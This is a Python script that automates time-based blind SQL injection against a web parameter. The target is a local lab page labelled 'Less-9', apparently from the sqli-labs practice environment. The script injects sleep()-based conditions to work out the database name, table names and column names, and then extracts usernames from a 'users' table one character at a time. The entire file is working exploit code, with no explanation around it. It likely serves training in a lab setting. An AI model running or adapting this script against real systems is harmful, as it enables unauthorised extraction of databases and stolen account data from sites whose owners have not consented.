import time
import string
import requests
from concurrent.futures import ThreadPoolExecutor

def db_length():
    name = ''
    for i in range(1,11):
        payload = url + "1' and if(length(database())={},sleep(3),1)%23".format(i)
        #print(payload)
        start = time.time()
        req = requests.get(payload)
        end = time.time()
        if end - start > 3:
            name = i
            print(name)
    print('db_len :',name)

def db_name():
    name = ''
    for i in range(1,9):
        for j in string.digits + string.ascii_letters:
            payload = url + "1' and if(substr(database(),{0},1)='{1}',sleep(3),1)%23".format(i,j)
            #print(payload)
            start = time.time()
            req = requests.get(payload)
            end = time.time()
            if end - start > 3:
                name += j
                break
    print('db_name: ',name)

def tb_name():
    list = []
    for i in range(0,9):
        name = ''
        for j in range(1,10):
            for k in string.ascii_letters + string.digits:
                payload = url + "1' and if(substr((select table_name from information_schema.tables where table_schema=database() limit {0},1),{1},1)='{2}',sleep(3),1)%23".format(i,j,k)
                # print(payload)
                start = time.time()
                req = requests.get(payload)
                end = time.time()
                if end - start > 3:
                    name += k
                    break
        list.append(name)
    print('tb_name: ',list)

def col_name():
    list = []
    for i in range(0,9):
        name = ''
        for j in range(1,10):
            for k in string.ascii_letters + string.digits:
                payload = url + "1' and if(substr((select column_name from information_schema.columns where table_name='users' limit {0},1),{1},1)='{2}',sleep(3),1)%23".format(i,j,k)
                # print(payload)
                start = time.time()
                req = requests.get(payload)
                end = time.time()
                if end - start > 3:
                    name += k
                    break
        list.append(name)
    print('col_name: ',list)

def dump():
    list = []
    for i in range(0,15):
        name = ''
        for j in range(1,10):
            for k in range(1,128):
                payload = url + "1' and if(ascii(substr((select username from users limit {0},1),{1},1))={2},sleep(3),1)%23".format(i,j,k)
                # print(payload)
                start = time.time()
                req =requests.get(payload)
                end = time.time()
                if end - start > 3:
                    name += chr(k)
                    break
        list.append(name)
    print('Value: ',list)



if __name__ == '__main__':
    url = "http://192.168.1.125:32769/Less-9/?id="
    db_length()
    db_name()
    tb_name()
    col_name()
    dump()